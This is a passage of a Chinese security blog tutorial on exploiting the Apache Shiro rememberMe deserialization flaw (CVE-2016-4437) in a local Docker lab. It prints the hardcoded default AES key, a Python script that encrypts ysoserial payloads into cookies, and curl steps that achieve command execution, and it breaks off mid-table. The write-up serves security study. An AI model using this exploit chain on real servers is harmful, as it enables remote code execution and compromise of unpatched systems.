#  Apache Shiro 反序列化漏洞利用全解析  
原创 biabai
                    biabai  白白学安全   2026-07-08 15:58  
  
   
  
   
  
Apache Shiro 反序列化漏洞利用全解析  
  
从环境搭建到实战利用 —— 5 种场景深度复现与原理剖析  
  
   
  
本文所有实验均在本地 Docker/JVM 环境中进行，仅用于安全研究学习目的。  
  
  
   
# 目录  
  
一、背景与原理概述  
  
    
1.1  
   
Apache Shiro 简介  
  
    
1.2  
   
rememberMe 机制详解  
  
    
1.3  
   
两个关键漏洞对比（Shiro-550 / Shiro-721）  
  
二、环境搭建  
  
    
2.1  
   
Shiro-550 环境（vulhub Docker）  
  
    
2.2  
   
Shiro-721 环境（自建 Spring Boot）  
  
    
2.3  
   
工具准备（ysoserial / Python 加密脚本）  
  
三、场景一：有 Key 有链 —— 标准 RCE  
  
    
3.1  
   
漏洞指纹检测  
  
    
3.2  
   
利用步骤详解  
  
    
3.3  
   
Gadget 链矩阵测试  
  
    
3.4  
   
反序列化链原理深入  
  
四、场景二：有 Key 无链 —— 密钥检测与利用  
  
    
4.1  
   
密钥检测 Oracle 原理  
  
    
4.2  
   
实战密钥爆破  
  
    
4.3  
   
确认密钥后的利用策略  
  
五、场景三：高版本 JDK 下的 Shiro 利用  
  
    
5.1  
   
JDK 版本对利用的影响分析  
  
    
5.2  
   
JDK 11 实验验证  
  
    
5.3  
   
关键结论  
  
六、场景四：Shiro-550 vs Shiro-721 对比  
  
    
6.1  
   
核心区别  
  
    
6.2  
   
Padding Oracle 攻击原理详解  
  
    
6.3  
   
实验：550 在 1.4.1 上的失效验证  
  
    
6.4  
   
版本修复时间线  
  
七、场景五：不出网环境利用（内存马/回显）  
  
    
7.1  
   
为什么 Shiro 天然不需要出网  
  
    
7.2  
   
不出网的挑战：命令回显  
  
    
7.3  
   
Tomcat Valve 内存马注入  
  
    
7.4  
   
内存马源码详解  
  
    
7.5  
   
实战效果展示  
  
八、防御建议与总结  
  
  
   
# 一、背景与原理概述  
## 1.1 Apache Shiro 简介  
  
Apache Shiro 是一个强大且易用的 Java 安全框架，提供认证（Authentication）、授权（Authorization）、加密（Cryptography）和会话管理（Session Management）等功能。它被广泛应用于 Java Web 项目中，特别是在 Spring Boot 生态中，作为 Spring Security 的轻量级替代方案。  
  
Shiro 的流行程度使其成为攻击者重点关注的目标。据统计，大量 Java Web 应用使用 Shiro 进行身份认证，而 Shiro 的 "记住我"（Remember Me）功能中存在的反序列化漏洞，是 Java 安全领域最经典、最常被利用的漏洞之一。  
## 1.2 rememberMe 机制详解  
  
当用户登录时勾选 "Remember Me" 复选框，Shiro 会将用户身份信息通过以下流程写入 Cookie：  
  
用户登录（勾选 Remember Me）            
  
          
↓            
  
序列化用户身份（PrincipalCollection 对象）            
  
          
↓            
  
AES-CBC 加密            
  
    
├── Key: Shiro ≤1.2.4 使用硬编码默认密钥            
  
    
│  
          
Shiro ≥1.2.5 使用随机生成密钥            
  
    
└── IV: 每次随机生成 16 字节            
  
          
↓            
  
Base64 编码 → 写入 Set-Cookie: rememberMe=        ↓      下次请求携带 Cookie → Base64 解码 → AES-CBC 解密 → 反序列化 → 恢复身份  
  
漏洞核心：如果攻击者能控制 rememberMe Cookie 的内容（即知道 AES 密钥或能通过 Padding Oracle 伪造密文），就可以构造包含恶意 Java 对象的序列化数据。当服务器解密并反序列化该数据时，恶意对象的 readObject / 静态代码块 会被触发，实现远程代码执行（RCE）。  
  
关键代码位置：  
  
// org.apache.shiro.mgt.AbstractRememberMeManager            
  
public PrincipalCollection getRememberedPrincipals(SubjectContext ctx) {            
  
      
byte[] bytes = getRememberedSerializedIdentity(ctx);  
    
// 从 Cookie 获取            
  
      
PrincipalCollection principals = convertBytesToPrincipals(bytes, ctx);            
  
      
//  
                                  
↑ 这里调用 decrypt → deserialize            
  
      
return principals;            
  
}            
  
  
// 解密方法            
  
protected byte[] decrypt(byte[] encrypted) {            
  
      
return cipherService.decrypt(encrypted, getDecryptionCipherKey());            
  
      
//  
                                        
↑ Shiro 1.2.4: 硬编码密钥!            
  
}            
  
  
// 默认密钥 (Shiro 1.2.4 源码)            
  
// AbstractRememberMeManager.java            
  
private static final byte[] DEFAULT_CIPHER_KEY_BYTES =            
  
      
Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");  
    
// 16 字节 AES-128 密钥  
## 1.3 两个关键漏洞对比  
<table><tbody><tr><td data-colwidth="107" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">对比项</span></span></p></td><td data-colwidth="292" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Shiro-550 (CVE-2016-4437)</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Shiro-721 (CVE-2019-12422)</span></span></p></td></tr><tr><td data-colwidth="107" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">影响版本</span></span></p></td><td data-colwidth="292" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Apache Shiro ≤ 1.2.4</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Apache Shiro 1.2.5 ~ 1.4.1</span></span></p></td></tr><tr><td data-colwidth="107" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">核心问题</span></span></p></td><td data-colwidth="292" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">AES 密钥硬编码（默认密钥公开）</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">密钥随机但仍用 AES-CBC（Padding Oracle）</span></span></p></td></tr><tr><td data-colwidth="107" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">攻击前提</span></span></p></td><td data-colwidth="292" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">知道密钥（默认/字典/泄露）</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">不需要知道密钥，需要合法账号获取有效 Cookie</span></span></p></td></tr><tr><td data-colwidth="107" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">攻击复杂度</span></span></p></td><td data-colwidth="292" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">低（一次请求即可 RCE）</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">高（需要数万次请求探测 Oracle）</span></span></p></td></tr><tr><td data-colwidth="107" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">请求次数</span></span></p></td><td data-colwidth="292" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">1 次</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">~65536 × 块数 次</span></span></p></td></tr><tr><td data-colwidth="107" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">修复方案</span></span></p></td><td data-colwidth="292" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">密钥随机化 → Shiro 1.2.5</span></span></p></td><td data-colwidth="192" width="192" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">AES-CBC 改 AES-GCM → Shiro 1.4.2</span></span></p></td></tr></tbody></table>  
  
   
# 二、环境搭建  
## 2.1 Shiro-550 环境（vulhub Docker）  
  
使用 vulhub 提供的 CVE-2016-4437 Docker 环境，一键启动 Shiro 1.2.4 漏洞靶场：  
  
# 克隆 vulhub 仓库            
  
$ git clone --depth 1 https://github.com/vulhub/vulhub.git            
  
$ cd vulhub/shiro/CVE-2016-4437            
  
  
# 启动环境            
  
$ docker compose up -d            
  
  
# 验证服务启动            
  
$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8080/            
  
302  
    
← 重定向到登录页面，环境正常  
  
环境详细信息：  
<table><tbody><tr><td data-colwidth="316" width="288" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">组件</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">版本/值</span></span></p></td></tr><tr><td data-colwidth="316" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Apache Shiro</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">1.2.4</span></span></p></td></tr><tr><td data-colwidth="316" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">JDK</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">1.8.0_102 (OpenJDK)</span></span></p></td></tr><tr><td data-colwidth="316" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Tomcat</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">9.0.29 (Spring Boot 嵌入式)</span></span></p></td></tr><tr><td data-colwidth="316" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Spring Boot</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">2.1.5.RELEASE</span></span></p></td></tr><tr><td data-colwidth="316" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">默认密钥</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">kPH+bIxk5D2deZiIxcaaaA==</span></span></p></td></tr><tr><td data-colwidth="316" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">classpath: commons-beanutils</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">1.9.2</span></span></p></td></tr><tr><td data-colwidth="316" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">classpath: commons-collections</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">3.2.1</span></span></p></td></tr><tr><td data-colwidth="316" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">classpath: commons-logging</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">1.1.1</span></span></p></td></tr><tr><td data-colwidth="316" width="288" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">默认账号</span></span></p></td><td data-colwidth="288" width="288" valign="top" style="border-width: medium medium 1pt;border-style: none none solid;border-color: currentcolor currentcolor rgb(79, 129, 189);padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">admin / vulhub</span></span></p></td></tr></tbody></table>  
   
  
启动后访问登录页面：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/p5fhoJ8nULIEW0piaKial2X6ramZsjBicTv2icwBhZkbllubLPiabrVtwMrOibqFry8oLicqWNCkhRibrZmBuPpV1niaZ9HGomWGGZDloaiaWTdObo6aE/640?wx_fmt=png "")  
  
图 2-1：Shiro 1.2.4 登录页面（Docker 环境）—— 注意 "Remember me" 复选框  
## 2.2 Shiro-721 环境（自建）  
  
为了对比 Shiro-550 和 Shiro-721，我们自建一个使用 Shiro 1.4.1 的 Spring Boot 应用。关键区别：Shiro 1.4.1 不再使用硬编码密钥，而是在每次应用启动时随机生成 AES 密钥。  
  
pom.xml 关键依赖：  
  
<dependencies>  
  
    <!-- Shiro 1.4.1 (随机密钥, AES-CBC) -->  
  
    <dependency>  
  
        <groupId>org.apache.shiro</groupId>  
  
        <artifactId>shiro-spring</artifactId>  
  
        <version>1.4.1</version>  
  
    </dependency>  
  
  
    <!-- Gadget chain 依赖 (模拟真实环境) -->  
  
    <dependency>  
  
        <groupId>commons-collections</groupId>  
  
        <artifactId>commons-collections</artifactId>  
  
        <version>3.2.1</version>  
  
    </dependency>  
  
</dependencies>  
  
  
核心配置代码：  
  
@Bean            
  
public DefaultWebSecurityManager securityManager() {            
  
      
DefaultWebSecurityManager sm = new DefaultWebSecurityManager();            
  
      
sm.setRealm(realm());            
  
      
// CookieRememberMeManager 默认使用随机 AES 密钥            
  
      
// （不同于 Shiro ≤1.2.4 的硬编码密钥）            
  
      
sm.setRememberMeManager(new CookieRememberMeManager());            
  
      
return sm;            
  
}  
  
# 构建并启动            
  
$ cd shiro721 && mvn clean package -DskipTests            
  
$ java -jar target/shiro721-1.0.jar --server.port=8082            
  
# Tomcat started on port(s): 8082  
## 2.3 工具准备  
  
ysoserial —— Java 反序列化 Gadget 链生成器：  
  
# 下载 ysoserial            
  
$ wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar            
  
  
# 基本用法：生成序列化 payload            
  
$ java -jar ysoserial-all.jar""       # 例：java -jar ysoserial-all.jar CommonsBeanutils1 "touch /tmp/pwned"  
  
shiro_exp.py —— AES 加密脚本（将序列化数据加密为 rememberMe Cookie）：  
  
#!/usr/bin/env python3            
  
import base64, os, subprocess, argparse            
  
from Crypto.Cipher import AES            
  
from Crypto.Util.Padding import pad            
  
  
DEFAULT_KEY = "kPH+bIxk5D2deZiIxcaaaA=="  
    
# Shiro 1.2.4 默认密钥            
  
  
def gen_payload(chain, cmd):            
  
      
"""使用 ysoserial 生成 Java 序列化 payload"""            
  
      
out = subprocess.run(            
  
          
["java", "-jar", "ysoserial-all.jar", chain, cmd],            
  
          
capture_output=True)            
  
      
return out.stdout            
  
  
def encrypt_cookie(raw_bytes, key_b64=DEFAULT_KEY):            
  
      
"""AES-CBC 加密 + Base64 编码            
  
      
  
      
加密过程：            
  
      
1. Base64 解码密钥 → 16 字节 AES 密钥            
  
      
2. 生成随机 16 字节 IV            
  
      
3. PKCS5 填充明文到 16 字节整数倍            
  
      
4. AES-CBC 加密            
  
      
5. 密文格式：IV(16字节) + CipherText            
  
      
6. Base64 编码 → Cookie 值            
  
      
"""            
  
      
key = base64.b64decode(key_b64)            
  
      
iv = os.urandom(16)            
  
      
ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(raw_bytes, 16))            
  
      
return base64.b64encode(iv + ct).decode()            
  
  
# 使用方法：            
  
# python3 shiro_exp.py CommonsBeanutils1 "touch /tmp/pwned"            
  
# python3 shiro_exp.py x x --raw payload.ser  
    
(使用预生成文件)            
  
# python3 shiro_exp.py x x --raw payload.ser --key "custom_key=="  
  
  
   
# 三、场景一：有 Key 有链 —— 标准 RCE  
## 3.1 场景说明  
  
这是 Shiro 反序列化漏洞利用的最基础场景：            
  
• 已知条件：攻击者知道目标的 AES 密钥（如默认密钥、通过信息泄露获取等）            
  
• 目标 classpath 上存在可利用的反序列化 Gadget 链（如 commons-beanutils、commons-collections）            
  
• 攻击结果：一次 HTTP 请求即可实现远程命令执行（RCE）  
## 3.2 第一步：漏洞指纹检测  
  
在利用之前，需要先确认目标使用了 Shiro 框架。Shiro 有一个非常明显的指纹特征：当发送无效的 rememberMe Cookie 时，服务器会在响应中设置 rememberMe=deleteMe 来清除该 Cookie。  
  
检测方法：  
  
# 发送任意无效 rememberMe Cookie            
  
$ curl -s -i -H "Cookie: rememberMe=invalid_test" http://127.0.0.1:8080/            
  
  
HTTP/1.1 302            
  
Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0;  
    
← Shiro 指纹!            
  
Set-Cookie: JSESSIONID=...; Path=/; HttpOnly            
  
Location: http://127.0.0.1:8080/login  
  
只要 HTTP 响应中出现 Set-Cookie: rememberMe=deleteMe，就可以确认目标使用了 Apache Shiro 框架。这是最快速、最可靠的 Shiro 指纹识别方法。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/p5fhoJ8nULIQaz98ENSib99H7vYuU6qHl0Qican5BheCPaXn2KqvkibOB6yml5g92iapvibk4ctbSLLzEYibwQlaHCHh4AxQgNm60u6keb4vTZAeQ/640?wx_fmt=png "")  
  
图 3-1：Shiro 指纹检测 —— 发送无效 rememberMe Cookie 后返回 deleteMe  
## 3.3 第二步：生成恶意 Payload 并利用  
  
完整的利用过程分为三步：生成 → 加密 → 发送  
  
Step 1: 使用 ysoserial 生成 Gadget Payload  
  
# 使用 CommonsBeanutils1 链，执行 touch /tmp/shiro_rce_proof            
  
$ java -jar ysoserial-all.jar CommonsBeanutils1 "touch /tmp/shiro_rce_proof" > payload.ser            
  
  
# payload.ser 是一个 Java 序列化文件，包含恶意的 PriorityQueue 对象            
  
# 反序列化时会通过 BeanComparator → PropertyUtils → TemplatesImpl 链            
  
# 最终调用 Runtime.exec("touch /tmp/shiro_rce_proof")  
  
Step 2: 用 AES 默认密钥加密为 rememberMe Cookie  
  
# shiro_exp.py 自动完成：ysoserial生成 → AES加密 → Base64编码            
  
$ COOKIE=$(python3 shiro_exp.py CommonsBeanutils1 "touch /tmp/shiro_rce_proof")            
  
$ echo "Cookie 长度: ${#COOKIE} 字符"  
    
  
Cookie 长度: 3736 字符  
  
Step 3: 发送恶意 Cookie 触发反序列化  
  
$ curl -s -o /dev/null -w "HTTP: %{http_code}\n" \            
  
      
-H "Cookie: rememberMe=$COOKIE" \            
  
      
http://127.0.0.1:8080/            
  
HTTP: 302  
    
← 服务器处理了 Cookie（反序列化已触发）  
  
Step 4: 验证 RCE 成功  
  
$ docker exec cve-2016-4437-web-1 ls -la /tmp/shiro_rce_proof            
  
-rw-r--r-- 1 root root 0 Jul  
    
8 11:13 /tmp/shiro_rce_proof            
  
                                          
↑ 文件已创建，RCE 成功!  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/p5fhoJ8nULJN0oqeiaPb9MyoTqtOLgibVMk4ZY2rYS8icibxnXvwboYM2Ng6ZymM5yqUGZ6Tsg5SicoE1iaLlic5MeGckoACs3DytTicqMdaPic4ibibiaM/640?wx_fmt=png "")  
  
图 3-2：CB1 链 RCE 完整过程 —— 生成 payload → 发送 Cookie → 验证文件创建  
## 3.4 Gadget 链矩阵测试  
  
不同的 Gadget 链有不同的依赖和适用条件。我们对 Shiro 1.2.4 (JDK 1.8.0_102) 环境进行了全面的链测试，以确定哪些链可用：  
<table><tbody><tr><td data-colwidth="154" width="154" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">Gadget 链</span></span></p></td><td data-colwidth="63" width="63" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">结果</span></span></p></td><td data-colwidth="161" width="161" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">依赖库</span></span></p></td><td data-colwidth="212" width="212" valign="top" style="border-width: 1pt medium medium;border-style: solid none none;border-color: rgb(79, 129, 189) currentcolor currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">失败原因</span></span></p></td></tr><tr><td data-colwidth="154" width="154" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">CommonsBeanutils1</span></span></p></td><td data-colwidth="63" width="63" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">RCE 成功 ✓</span></span><o:page></o:page></p></td><td data-colwidth="161" width="161" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span style="font-family:微软雅黑;mso-ascii-font-family:微软雅黑;mso-fareast-font-family:微软雅黑;font-variant:normal;text-transform:none;"><span leaf="">commons-beanutils (Shiro 自带)</span></span></p></td><td data-colwidth="212" width="212" valign="top" style="border-width: medium;border-style: none;border-color: currentcolor;padding: 0pt 5.4pt;"><p style="margin-bottom:0.0pt;line-height:normal;"><span 